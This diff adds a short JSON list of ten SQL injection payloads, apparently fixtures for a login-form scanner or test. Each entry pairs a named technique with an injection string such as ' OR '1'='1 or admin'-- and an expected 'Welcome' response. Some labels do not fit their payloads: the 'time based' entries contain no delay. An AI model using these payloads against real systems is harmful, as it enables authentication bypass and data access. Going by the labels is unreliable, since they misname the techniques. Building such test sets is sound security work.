@@ -1,0 +1,52 @@
+[
+    {
+        "name": "Login Bypass",
+        "payload": "' OR '1'='1",
+        "expected_result": "Welcome"
+    },
+    {
+        "name": "Union Based",
+        "payload": "' UNION SELECT 1,2,3--",
+        "expected_result": "2"
+    },
+    {
+        "name": "Error Based",
+        "payload": "' OR 1=1--",
+        "expected_result": "Welcome"
+    },
+    {
+        "name": "Boolean Based",
+        "payload": "' OR 1=1#",
+        "expected_result": "Welcome"
+    },
+    {
+        "name": "Time Based",
+        "payload": "' OR (SELECT COUNT(*) FROM users) > 0--",
+        "expected_result": "Welcome"
+    },
+    {
+        "name": "Login Bypass 2",
+        "payload": "admin'--",
+        "expected_result": "Welcome"
+    },
+    {
+        "name": "Union Based 2",
+        "payload": "' UNION SELECT NULL,NULL,NULL--",
+        "expected_result": "Welcome"
+    },
+    {
+        "name": "Error Based 2",
+        "payload": "' OR '1'='1'--",
+        "expected_result": "Welcome"
+    },
+    {
+        "name": "Boolean Based 2",
+        "payload": "' OR '1'='1'#",
+        "expected_result": "Welcome"
+    },
+    {
+        "name": "Time Based 2",
+        "payload": "' OR (SELECT COUNT(*) FROM users) > 1--",
+        "expected_result": "Welcome"
+    }
+] 
